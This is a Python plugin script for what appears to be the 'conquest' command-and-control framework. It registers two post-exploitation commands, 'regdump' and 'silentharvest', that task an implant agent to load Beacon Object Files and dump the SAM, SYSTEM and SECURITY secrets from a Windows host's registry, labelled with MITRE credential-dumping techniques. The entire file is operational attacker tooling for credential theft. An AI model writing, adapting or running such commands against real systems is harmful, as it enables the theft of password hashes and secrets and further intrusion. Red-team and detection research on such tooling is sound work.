import conquest
import os.path

SCRIPT_DIR = os.path.dirname(__file__)

cmd_regdump = (
    conquest.createCommand(name="regdump", description="Dump SAM, SYSTEM and SECURITY from the Windows registry.", example="regdump C:\\Windows\\Tasks",
                           message="Tasked agent to dump SAM, SYSTEM and SECURITY.", mitre=["T1003.002"])
            .addArgString("path", "Output path (default: current directory).", False, ".")
            .setHandler(lambda agentId, cmdline, args: (
                path := conquest.get_string(args, 0),

                bof := os.path.join(SCRIPT_DIR, f"regdump/regdump.{conquest.arch(agentId)}.o"),
                params := conquest.bof_pack("z", [
                    path         # z: Output path
                ]),

                conquest.execute_alias(agentId, cmdline, f"bof {bof} {params}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("post-exploitation")

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

cmd_silentharvest = (
    conquest.createCommand(name="silentharvest", description="Gather SAM and SECURITY secrets using the SilentHarvest method of dumping registry values.", example="silentharvest",
                           message="Tasked agent to gather SAM and SECURITY secrets using the SilentHarvest method of dumping registry values.", mitre=["T1003"])
            .setHandler(lambda agentId, cmdline, args: (
                bof := os.path.join(SCRIPT_DIR, f"SilentHarvest_BOF/dist/silentharvest.{conquest.arch(agentId)}.o"),
                conquest.execute_alias(agentId, cmdline, f"bof {bof}") if os.path.exists(bof)
                else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
            ))
).registerToGroup("post-exploitation")